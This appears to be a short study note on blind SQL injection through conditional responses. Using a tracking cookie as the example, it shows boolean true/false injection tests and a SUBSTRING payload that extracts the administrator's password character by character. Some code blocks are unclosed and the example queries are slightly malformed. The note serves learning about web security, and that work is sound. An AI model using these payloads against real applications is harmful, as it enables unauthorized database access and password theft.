---
Title: Blind SQLi
tags:
  - SQLi
  - BLINDSQL
---
Blind SQL is not necessarily being "blind", but rather looking at other intricacies the application returns whenever you inject a query. 

# Exploiting conditional responses

For example, we have this vulnerable cookie.
```
Cookie: TrackingId=abcdefghijklmnopqrstuvwxyz
```
> [!The query that the TrackingId uses ]
> ```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz'

A successful query will return "Welcome!", and an unsuccessful one will return nothing. We can exploit this functionality by injecting arbitrary sql queries, and constantly checking if the query returns "Welcome!" or not.

> [!Example]
> ```sql
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='1
> -- above returns true
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='2
> -- above returns false

> [!Sample payload]
> ```sql
> -- SUBSTRING(string, position of the string, length of the string(usually 1))
> 
> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
> -- this function is as follows, where the first letter of the password of administrator is greater than m
